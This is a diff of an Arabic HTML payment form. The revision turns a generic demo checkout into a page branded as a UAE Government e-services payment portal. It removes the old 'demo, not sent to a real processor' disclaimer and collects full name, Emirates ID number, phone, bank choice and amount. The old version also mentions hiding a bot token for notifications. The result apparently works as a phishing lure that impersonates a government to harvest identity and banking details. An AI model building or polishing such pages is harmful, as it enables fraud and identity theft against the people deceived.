@@ -1,242 +1,93 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>بوابة دفع - تصميم مستوحى</title>
-<style>
-  :root{
-    --bg:#f6f8fb; --card:#fff; --accent:#0b61c2; --accent-2:#c15c37;
-    --muted:#6b7280; --shadow:0 6px 18px rgba(12,23,40,0.08);
-  }
-  *{box-sizing:border-box}
-  body{margin:0;font-family:Segoe UI, Tahoma, Arial, "Noto Sans Arabic", sans-serif;background:var(--bg);color:#111; -webkit-font-smoothing:antialiased}
-  header{background:linear-gradient(90deg,#0b61c2 0%, #0b61c2 100%);color:white;padding:20px 16px}
-  .wrap{max-width:1100px;margin:18px auto;padding:0 16px}
-  .top{display:flex;gap:16px;align-items:center;justify-content:space-between;flex-wrap:wrap}
-  .brand{display:flex;gap:12px;align-items:center}
-  .brand .logo{width:72px;height:52px;background:white;border-radius:8px;display:flex;align-items:center;justify-content:center;color:var(--accent);font-weight:700}
-  .brand h1{font-size:18px;margin:0}
-  .hero{display:grid;grid-template-columns:1fr 420px;gap:20px;margin-top:18px;align-items:start}
-  @media(max-width:920px){.hero{grid-template-columns:1fr;}}
-  .info-card{background:var(--card);padding:22px;border-radius:12px;box-shadow:var(--shadow)}
-  .info-card h2{margin:0 0 8px;font-size:20px;color:var(--accent)}
-  .info-card p{color:var(--muted);margin:0 0 12px;line-height:1.6}
-  .features{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
-  .feature{background:#f8fbff;padding:10px 12px;border-radius:8px;color:var(--muted);font-size:14px}
-  /* right column - form */
-  .panel{background:var(--card);padding:18px;border-radius:12px;box-shadow:var(--shadow)}
-  .panel h3{margin:0 0 12px;color:var(--accent)}
-  .form-row{display:flex;gap:10px}
-  .form-row .col{flex:1}
-  label{display:block;font-weight:600;margin-bottom:6px}
-  input[type="text"], input[type="email"], input[type="tel"], select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;font-size:15px}
-  .banks{max-height:240px;overflow:auto;padding:8px;border:1px solid #f0f2f5;border-radius:8px;background:#fff;margin-bottom:12px}
-  .bank-item{display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px dashed #f1f3f6}
-  .bank-item:last-child{border-bottom:0}
-  .bank-item input{transform:scale(1.1)}
-  .submit{display:flex;gap:10px;align-items:center}
-  button.primary{flex:1;padding:12px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-weight:700;cursor:pointer}
-  button.ghost{padding:10px 12px;border-radius:10px;border:1px solid #e6e9ee;background:#fff;color:var(--muted);cursor:pointer}
-  .small{font-size:13px;color:var(--muted)}
-  /* overview section */
-  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px}
-  @media(max-width:920px){.grid3{grid-template-columns:1fr}}
-  .box{background:var(--card);padding:16px;border-radius:10px;box-shadow:var(--shadow)}
-  .summary{display:flex;gap:12px;align-items:center;justify-content:space-between}
-  .summary .left{flex:1}
-  .summary .amount{font-size:22px;font-weight:800;color:var(--accent-2)}
-  footer{margin-top:28px;padding:20px 0;color:var(--muted);text-align:center}
-  /* tiny helpers */
-  .muted{color:var(--muted)}
-  .divider{height:1px;background:#f1f3f6;margin:12px 0;border-radius:2px}
-  /* responsive tweaks */
-  @media(max-width:520px){
-    .brand .logo{width:56px;height:42px;font-size:14px}
-    .hero{gap:12px}
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة دفع الخدمات الإلكترونية</title>
+  <style>
+    body{font-family:Tahoma, Arial, sans-serif;background:#f7f7f7;margin:0;padding:16px}
+    .container{max-width:420px;margin:24px auto}
+    .logo{display:block;margin:0 auto 10px;max-width:110px}
+    .card{background:#fff;border:1px solid #e6e6e6;border-radius:10px;padding:16px}
+    h1{font-size:18px;color:#1f1f1f;margin:8px 0 4px;text-align:center}
+    .sub{font-size:13px;color:#666;text-align:center;margin-bottom:14px}
+    label{display:block;font-weight:700;font-size:14px;margin:10px 0 6px;color:#222}
+    .field{width:100%;padding:12px;border:1px solid #cfcfcf;border-radius:6px;font-size:15px;box-sizing:border-box;background:#fff}
+    /* مظهر قائمة البنك كالتي بالصورة */
+    select.field{
+      appearance:none; -webkit-appearance:none; -moz-appearance:none;
+      background-image: linear-gradient(45deg, transparent 50%, #666 50%),
+                        linear-gradient(135deg, #666 50%, transparent 50%);
+      background-position: calc(1.2rem) center, calc(2rem) center; /* السهم يسار لأن RTL */
+      background-size: 6px 6px;
+      background-repeat: no-repeat;
+      padding-left:42px; /* مساحة للسهم */
+    }
+    .btn{width:100%;padding:12px;background:#186a3b;color:#fff;border:0;border-radius:8px;font-weight:800;cursor:pointer;margin-top:8px}
+    .note{color:#777;font-size:12px;margin-top:12px;text-align:center}
+  </style>
 </head>
 <body>
-  <header>
-    <div class="wrap top">
-      <div class="brand">
-        <div class="logo">PAY</div>
-        <div>
-          <h1>بوابة الدفع الإلكتروني</h1>
-          <div class="small">سهل • آمن • موثوق</div>
-        </div>
-      </div>
-      <div class="small">تواصل: info@example.com — دعم مباشر</div>
-    </div>
-  </header>
+  <div class="container">
+    <!-- ضع شعارك هنا إن رغبت -->
+    <!-- <img class="logo" src="logo.png" alt="الشعار"> -->
 
-  <div class="wrap hero">
-    <!-- left: info + summary -->
-    <div>
-      <div class="info-card">
-        <h2>سداد الرسوم والفواتير</h2>
-        <p>استخدم هذه البوابة لسداد الرسوم بسهولة عبر البنوك المحلية والدولية المدعومة. الواجهة بسيطة وتعمل على الجوال والكمبيوتر.</p>
+    <div class="card">
+      <h1>بوابة دفع قيمة الخدمات الإلكترونية</h1>
+      <div class="sub">حكومة الإمارات العربية المتحدة</div>
 
-        <div class="features">
-          <div class="feature">قائمة بنوك واسعة</div>
-          <div class="feature">تجربة RTL عربية</div>
-          <div class="feature">تحويل آمن للتجريب</div>
-        </div>
+      <form id="payForm">
+        <label for="fullName">الاسم بالكامل *</label>
+        <input id="fullName" class="field" type="text" placeholder="اكتب الاسم بالكامل" required>
 
-        <div class="divider"></div>
+        <label for="idNumber">رقم الهوية *</label>
+        <input id="idNumber" class="field" type="text" placeholder="مثال: 784-XXXX-XXXXXXX-X" required>
 
-        <div class="grid3" style="margin-top:10px">
-          <div class="box">
-            <div class="muted">الخدمة</div>
-            <div style="font-weight:700;margin-top:6px">سداد ضريبة القيمة المضافة</div>
-          </div>
-          <div class="box">
-            <div class="muted">رقم الفاتورة</div>
-            <div style="font-weight:700;margin-top:6px">#123456</div>
-          </div>
-          <div class="box">
-            <div class="muted">الحالة</div>
-            <div style="font-weight:700;margin-top:6px;color:green">قابل للدفع</div>
-          </div>
-        </div>
-      </div>
+        <label for="phone">رقم الجوال *</label>
+        <input id="phone" class="field" type="tel" placeholder="05XXXXXXXX" required>
 
-      <div style="height:16px"></div>
+        <!-- هذا هو الحقل المطلوب: داخل المربع اختار البنك -->
+        <label for="bank">ادخل البنك الخاص بك *</label>
+        <select id="bank" class="field" required>
+          <option value="" disabled selected>— اختر البنك —</option>
+          <option>بنك أبوظبي الأول</option>
+          <option>مصرف أبوظبي الإسلامي</option>
+          <option>بنك أبوظبي التجاري</option>
+          <option>بنك الإمارات دبي الوطني</option>
+          <option>بنك دبي الإسلامي</option>
+          <option>بنك دبي التجاري</option>
+          <option>بنك المشرق</option>
+          <option>مصرف الشارقة الإسلامي</option>
+          <option>بنك عجمان</option>
+          <option>مصرف الهلال</option>
+          <option>بنك رأس الخيمة</option>
+          <option>بنك الفجيرة الوطني</option>
+          <option>HSBC</option>
+          <option>LIV</option>
+          <option>البنك التجاري الدولي</option>
+          <option>بنك ستاندرد تشارترد</option>
+        </select>
 
-      <div class="info-card">
-        <h2>معلومات مهمة</h2>
-        <p class="muted">هذا نموذج واجهة جاهز للاختبار. عند الربط مع خادم آمن يمكنك إخفاء توكن البوت وإرسال رسائل أو اشعارات دون كشف معلومات حساسة للمستخدم.</p>
-      </div>
-    </div>
+        <label for="amount">قيمة رسوم السداد (درهم إماراتي) *</label>
+        <input id="amount" class="field" type="number" min="0" step="0.01" placeholder="مثال: 100.00" required>
 
-    <!-- right: payment panel -->
-    <aside class="panel">
-      <h3>أدخل بيانات السداد</h3>
-
-      <form id="checkoutForm" novalidate>
-        <label for="payerName">الاسم الكامل</label>
-        <input id="payerName" type="text" placeholder="اسم صاحب الحساب" required>
-
-        <label for="payerId">الهوية/المرجع</label>
-        <input id="payerId" type="text" placeholder="رقم الهوية / مرجع الدفع" required>
-
-        <label for="payerPhone">الجوال</label>
-        <input id="payerPhone" type="tel" placeholder="05XXXXXXXX" required>
-
-        <label for="amount">المبلغ (AED)</label>
-        <input id="amount" type="text" placeholder="مثال: 100.00" inputmode="decimal" required>
-
-        <label style="margin-top:6px">اختر البنك للدفع</label>
-        <div class="banks" id="banksList" role="listbox" aria-label="قائمة البنوك">
-          <!-- Bank items (radio) -->
-          <!-- We'll include lots of UAE banks and regional ones -->
-          <label class="bank-item"><input type="radio" name="bank" value="بنك أبوظبي الأول"> <div>بنك أبوظبي الأول</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="مصرف أبوظبي الإسلامي"> <div>مصرف أبوظبي الإسلامي</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك أبوظبي التجاري"> <div>بنك أبوظبي التجاري</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك دبي الإسلامي"> <div>بنك دبي الإسلامي</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك دبي التجاري"> <div>بنك دبي التجاري</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك المشرق"> <div>بنك المشرق</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="مصرف الشارقة الإسلامي"> <div>مصرف الشارقة الإسلامي</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك عجمان"> <div>بنك عجمان</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="مصرف الهلال"> <div>مصرف الهلال</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك الإمارات دبي الوطني"> <div>بنك الإمارات دبي الوطني</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك أبو ظبي الإسلامى (ADIB)"> <div>ADIB</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك رأس الخيمة"> <div>بنك رأس الخيمة</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك الفجيرة الوطني"> <div>بنك الفجيرة الوطني</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="HSBC"> <div>HSBC</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك ستاندرد تشارترد"> <div>بنك ستاندرد تشارترد</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك الكويت الوطني"> <div>بنك الكويت الوطني</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="البنك الأهلي (مصر)"> <div>البنك الأهلي (مصر)</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="مصرف الإنماء"> <div>مصرف الإنماء</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="البنك التجاري الدولي"> <div>البنك التجاري الدولي</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بنك المصرف"> <div>بنك المصرف</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="LIV"> <div>LIV</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="QNB"> <div>QNB</div></label>
-          <label class="bank-item"><input type="radio" name="bank" value="بانك أوف أمريكا"> <div>Bank of America</div></label>
-          <!-- add more as needed -->
-        </div>
-
-        <div class="submit">
-          <button type="button" class="ghost" id="saveDraft">حفظ مؤقت</button>
-          <button type="submit" class="primary">تأكيد والدفع</button>
-        </div>
-
-        <div style="margin-top:10px" class="small muted">باستكمال الدفع أنت توافق على الشروط وسياسة الخصوصية.</div>
+        <button class="btn" type="submit">المتابعة</button>
       </form>
-    </aside>
-  </div>
 
-  <div class="wrap" style="margin-top:18px">
-    <div class="box" style="text-align:center">
-      <div class="muted">تجريبي — بيانات تُحفظ مؤقتاً ولا تُرسل لجهة دفع فعلية</div>
+      <div class="note">سيتم التحقق من البيانات قبل المتابعة.</div>
     </div>
   </div>
 
-  <footer>
-    <div class="wrap">
-      بوابة الدفع — تصميم مخصص مُلهم لواجهة دفع • 2025
-    </div>
-  </footer>
-
-<script>
-(function(){
-  // حفظ مسودة محلياً
-  document.getElementById('saveDraft').addEventListener('click', function(){
-    const name = document.getElementById('payerName').value.trim();
-    const id = document.getElementById('payerId').value.trim();
-    const phone = document.getElementById('payerPhone').value.trim();
-    const amount = document.getElementById('amount').value.trim();
-    const bankEl = document.querySelector('input[name="bank"]:checked');
-    const bank = bankEl ? bankEl.value : '';
-    const draft = { name, id, phone, amount, bank, savedAt: new Date().toISOString() };
-    localStorage.setItem('paymentDraft', JSON.stringify(draft));
-    alert('تم حفظ المسودة محلياً.');
-  });
-
-  // استرجاع مسودة إن وُجدت
-  window.addEventListener('load', function(){
-    try {
-      const draft = JSON.parse(localStorage.getItem('paymentDraft')||'null');
-      if (draft) {
-        if (draft.name) document.getElementById('payerName').value = draft.name;
-        if (draft.id) document.getElementById('payerId').value = draft.id;
-        if (draft.phone) document.getElementById('payerPhone').value = draft.phone;
-        if (draft.amount) document.getElementById('amount').value = draft.amount;
-        if (draft.bank) {
-          const el = Array.from(document.querySelectorAll('input[name="bank"]')).find(i => i.value===draft.bank);
-          if (el) el.checked = true;
-        }
-      }
-    } catch(e){}
-  });
-
-  // submit handler (تجريبي)
-  document.getElementById('checkoutForm').addEventListener('submit', function(e){
-    e.preventDefault();
-    const name = document.getElementById('payerName').value.trim();
-    const id = document.getElementById('payerId').value.trim();
-    const phone = document.getElementById('payerPhone').value.trim();
-    const amount = document.getElementById('amount').value.trim();
-    const bankEl = document.querySelector('input[name="bank"]:checked');
-    const bank = bankEl ? bankEl.value : '';
-
-    if(!name || !id || !phone || !amount || !bank){
-      alert('الرجاء ملء جميع الحقول واختيار بنك للدفع.');
-      return;
-    }
-
-    // ملخص معطي قبل التحويل (عرض داخل صفحة)
-    const summary = {
-      name, id, phone, amount, bank
-    };
-    sessionStorage.setItem('paymentSummary', JSON.stringify(summary));
-
-    // هنا: سلوك التحويل التجريبي — انتقل لصفحة verify أو payment كما تريد
-    // لن نرسل بيانات البطاقة هنا. فقط ننتقل لصفحة تجريبية.
-    window.location.href = 'payment.html';
-  });
-})();
-</script>
+  <script>
+    // مثال بسيط للتحقق — يمكنك حذفه إذا لا تريده
+    document.getElementById('payForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const bank = document.getElementById('bank').value;
+      if(!bank){ alert('الرجاء اختيار البنك.'); return; }
+      // تحويل تجريبي للصفحة التالية إن أردت
+      // window.location.href = 'payment.html';
+      alert('تم اختيار البنك: ' + bank);
+    });
+  </script>
 </body>
 </html>
